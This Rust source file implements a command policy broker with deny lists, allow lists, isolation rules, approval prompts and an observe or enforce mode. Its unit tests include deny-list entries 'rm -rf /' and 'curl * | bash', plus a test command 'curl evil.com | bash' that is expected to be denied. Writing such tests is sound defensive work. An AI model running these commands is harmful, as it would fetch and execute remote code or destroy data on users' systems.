use anyhow::{Context, Result};
use once_cell::sync::Lazy;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, RwLock};
use tracing::{debug, info, warn};

mod approval;
mod policy;
mod profile;
mod watcher;

pub use approval::{ApprovalCache, ApprovalContext, ApprovalStatus};
pub use policy::{Decision, Policy, Restriction, RestrictionType};
pub use profile::ProfileDetector;

static GLOBAL_BROKER: Lazy<Arc<RwLock<Broker>>> =
    Lazy::new(|| Arc::new(RwLock::new(Broker::new())));

pub struct Broker {
    policy: Arc<RwLock<Policy>>,
    approvals: Arc<RwLock<ApprovalCache>>,
    observe_only: AtomicBool,
    profile_detector: ProfileDetector,
}

impl Broker {
    pub fn new() -> Self {
        let default_policy = Policy::default();
        Self {
            policy: Arc::new(RwLock::new(default_policy)),
            approvals: Arc::new(RwLock::new(ApprovalCache::new())),
            observe_only: AtomicBool::new(true), // Start in observe mode
            profile_detector: ProfileDetector::new(),
        }
    }

    pub fn load_policy(&self, path: &Path) -> Result<()> {
        let content = std::fs::read_to_string(path)
            .with_context(|| format!("Failed to read policy from {:?}", path))?;

        let new_policy: Policy = serde_yaml::from_str(&content)
            .with_context(|| format!("Failed to parse policy from {:?}", path))?;

        let mut policy = self
            .policy
            .write()
            .map_err(|e| anyhow::anyhow!("Failed to acquire policy write lock: {}", e))?;
        *policy = new_policy;

        info!("Loaded policy from {:?}", path);
        Ok(())
    }

    pub fn detect_and_load_profile(&mut self, cwd: &Path) -> Result<()> {
        if let Some(profile_path) = self.profile_detector.find_profile(cwd)? {
            self.load_policy(&profile_path)?;
        }
        Ok(())
    }

    pub fn evaluate(&self, cmd: &str, cwd: &str, _world_id: Option<&str>) -> Result<Decision> {
        let policy = self
            .policy
            .read()
            .map_err(|e| anyhow::anyhow!("Failed to acquire policy read lock: {}", e))?;

        // Check denied commands first
        for pattern in &policy.cmd_denied {
            if matches_pattern(cmd, pattern) {
                if !self.observe_only.load(Ordering::Relaxed) {
                    log_violation(cmd, "Command explicitly denied");
                    return Ok(Decision::Deny("Command explicitly denied".into()));
                } else {
                    warn!(
                        "[OBSERVE] Would deny command: {} (pattern: {})",
                        cmd, pattern
                    );
                }
            }
        }

        // Check if allowed
        let mut allowed = false;
        for pattern in &policy.cmd_allowed {
            if matches_pattern(cmd, pattern) {
                allowed = true;
                break;
            }
        }

        if !allowed && !policy.cmd_allowed.is_empty() {
            if !self.observe_only.load(Ordering::Relaxed) {
                log_violation(cmd, "Command not in allowlist");
                return Ok(Decision::Deny("Command not explicitly allowed".into()));
            } else {
                warn!("[OBSERVE] Would deny command: {} (not in allowlist)", cmd);
            }
        }

        // Check if needs isolation
        for pattern in &policy.cmd_isolated {
            if matches_pattern(cmd, pattern) {
                info!("Command requires isolation: {} (pattern: {})", cmd, pattern);
                return Ok(Decision::AllowWithRestrictions(vec![Restriction {
                    type_: RestrictionType::IsolatedWorld,
                    value: "ephemeral".into(),
                }]));
            }
        }

        // Check if approval required
        if policy.require_approval && !self.observe_only.load(Ordering::Relaxed) {
            let approval_status = self.check_approval(cmd)?;
            match approval_status {
                ApprovalStatus::Approved => {
                    debug!("Command pre-approved: {}", cmd);
                }
                ApprovalStatus::Denied => {
                    return Ok(Decision::Deny("User denied approval".into()));
                }
                ApprovalStatus::Unknown => {
                    let context = ApprovalContext::new(cmd, cwd);
                    let approved = self.request_approval(cmd, &context)?;
                    if !approved {
                        return Ok(Decision::Deny("User denied approval".into()));
                    }
                }
            }
        }

        Ok(Decision::Allow)
    }

    pub fn quick_check(&self, argv: &[String], _cwd: &str) -> Result<Decision> {
        // Fast path for shims - just check deny list
        let cmd = argv.join(" ");
        let policy = self
            .policy
            .read()
            .map_err(|e| anyhow::anyhow!("Failed to acquire policy read lock: {}", e))?;

        for pattern in &policy.cmd_denied {
            if matches_pattern(&cmd, pattern) {
                if !self.observe_only.load(Ordering::Relaxed) {
                    return Ok(Decision::Deny("Command denied by policy".into()));
                } else {
                    warn!(
                        "[OBSERVE] Would deny in quick_check: {} (pattern: {})",
                        cmd, pattern
                    );
                }
            }
        }

        Ok(Decision::Allow)
    }

    pub fn set_observe_only(&self, observe: bool) {
        self.observe_only.store(observe, Ordering::Relaxed);
        info!(
            "Policy enforcement mode: {}",
            if observe { "OBSERVE" } else { "ENFORCE" }
        );
    }

    pub fn is_observe_only(&self) -> bool {
        self.observe_only.load(Ordering::Relaxed)
    }

    fn check_approval(&self, cmd: &str) -> Result<ApprovalStatus> {
        let approvals = self
            .approvals
            .read()
            .map_err(|e| anyhow::anyhow!("Failed to acquire approvals read lock: {}", e))?;
        Ok(approvals.check(cmd))
    }

    fn request_approval(&self, cmd: &str, context: &ApprovalContext) -> Result<bool> {
        approval::request_interactive_approval(cmd, context, &self.approvals)
    }
}

impl Default for Broker {
    fn default() -> Self {
        Self::new()
    }
}

// Global singleton functions for easy access
pub fn init(config_path: Option<&Path>) -> Result<()> {
    let broker = GLOBAL_BROKER
        .write()
        .map_err(|e| anyhow::anyhow!("Failed to acquire broker write lock: {}", e))?;

    if let Some(path) = config_path {
        broker.load_policy(path)?;
    }

    // Check for SUBSTRATE_WORLD=enabled to determine observe vs enforce
    if std::env::var("SUBSTRATE_WORLD").unwrap_or_default() == "enabled" {
        broker.set_observe_only(false);
    }

    Ok(())
}

pub fn evaluate(cmd: &str, cwd: &str, world_id: Option<&str>) -> Result<Decision> {
    let broker = GLOBAL_BROKER
        .read()
        .map_err(|e| anyhow::anyhow!("Failed to acquire broker read lock: {}", e))?;
    broker.evaluate(cmd, cwd, world_id)
}

pub fn quick_check(argv: &[String], cwd: &str) -> Result<Decision> {
    let broker = GLOBAL_BROKER
        .read()
        .map_err(|e| anyhow::anyhow!("Failed to acquire broker read lock: {}", e))?;
    broker.quick_check(argv, cwd)
}

pub fn detect_profile(cwd: &Path) -> Result<()> {
    let mut broker = GLOBAL_BROKER
        .write()
        .map_err(|e| anyhow::anyhow!("Failed to acquire broker write lock: {}", e))?;
    broker.detect_and_load_profile(cwd)
}

pub fn reload_policy(path: &Path) -> Result<()> {
    let broker = GLOBAL_BROKER
        .read()
        .map_err(|e| anyhow::anyhow!("Failed to acquire broker read lock: {}", e))?;
    broker.load_policy(path)
}

pub fn set_observe_only(observe: bool) {
    let broker = GLOBAL_BROKER
        .read()
        .expect("Failed to acquire broker read lock");
    broker.set_observe_only(observe);
}

fn matches_pattern(cmd: &str, pattern: &str) -> bool {
    // Simple glob matching for now, can be enhanced
    if pattern.contains('*') {
        let pattern =
            glob::Pattern::new(pattern).unwrap_or_else(|_| glob::Pattern::new("").unwrap());
        pattern.matches(cmd)
    } else {
        cmd.contains(pattern)
    }
}

fn log_violation(cmd: &str, reason: &str) {
    warn!("Policy violation: {} - Command: {}", reason, cmd);
    // In future, this could write to audit log or send telemetry
}

/// Get the current list of allowed domains for network egress from the active policy.
pub fn allowed_domains() -> Vec<String> {
    if let Ok(broker) = GLOBAL_BROKER.read() {
        if let Ok(policy) = broker.policy.read() {
            return policy.net_allowed.clone();
        }
    }
    Vec::new()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use tempfile::tempdir;

    fn poison_rwlock<T: Send + Sync + 'static>(lock: &Arc<RwLock<T>>) {
        let cloned = Arc::clone(lock);
        let _ = std::thread::spawn(move || {
            let _guard = cloned.write().unwrap();
            panic!("poison lock");
        })
        .join();
    }

    #[test]
    fn test_broker_creation() {
        let broker = Broker::new();
        assert!(broker.is_observe_only());
    }

    #[test]
    fn test_pattern_matching() {
        assert!(matches_pattern(
            "curl http://example.com | bash",
            "curl * | bash"
        ));
        assert!(matches_pattern("npm install", "npm install"));
        assert!(!matches_pattern("cargo build", "npm install"));
        assert!(matches_pattern("git clone repo", "git clone"));
    }

    #[test]
    fn test_quick_check_allow() {
        let broker = Broker::new();
        let result = broker
            .quick_check(&["echo".into(), "hello".into()], "/tmp")
            .unwrap();
        assert!(matches!(result, Decision::Allow));
    }

    #[test]
    fn test_load_policy() {
        let dir = tempdir().unwrap();
        let policy_path = dir.path().join("policy.yaml");

        let policy_content = r#"
id: test-policy
name: Test Policy
fs_read:
  - /tmp/*
fs_write:
  - /tmp/*
net_allowed:
  - github.com
cmd_allowed:
  - echo *
  - ls *
cmd_denied:
  - rm -rf /
  - curl * | bash
cmd_isolated:
  - npm install
require_approval: false
allow_shell_operators: true
"#;
        std::fs::write(&policy_path, policy_content).unwrap();

        let broker = Broker::new();
        broker.load_policy(&policy_path).unwrap();

        // Test that denied command is blocked (in enforce mode)
        broker.set_observe_only(false);
        let result = broker
            .quick_check(
                &["curl".into(), "evil.com".into(), "|".into(), "bash".into()],
                "/tmp",
            )
            .unwrap();
        assert!(matches!(result, Decision::Deny(_)));
    }

    #[test]
    fn poisoned_policy_lock_returns_error_in_evaluate() {
        let broker = Broker::new();
        poison_rwlock(&broker.policy);

        let result = std::panic::catch_unwind(|| broker.evaluate("echo ok", "/tmp", None));
        assert!(result.is_ok(), "broker.evaluate panicked on poisoned lock");

        let err = result
            .unwrap()
            .expect_err("expected poisoned lock to return error");
        assert!(
            err.to_string()
                .contains("Failed to acquire policy read lock"),
            "unexpected error: {err}"
        );

        broker.policy.clear_poison();
    }

    #[test]
    fn poisoned_approvals_lock_returns_error() {
        let broker = Broker::new();
        {
            let mut policy = broker.policy.write().unwrap();
            policy.require_approval = true;
        }
        broker.set_observe_only(false);
        poison_rwlock(&broker.approvals);

        let result = std::panic::catch_unwind(|| broker.evaluate("echo guarded", "/tmp", None));
        assert!(
            result.is_ok(),
            "broker.evaluate panicked with poisoned approvals"
        );

        let err = result
            .unwrap()
            .expect_err("expected approval read failure to return error");
        assert!(
            err.to_string().contains("approvals read lock"),
            "unexpected error: {err}"
        );

        broker.approvals.clear_poison();
    }
}
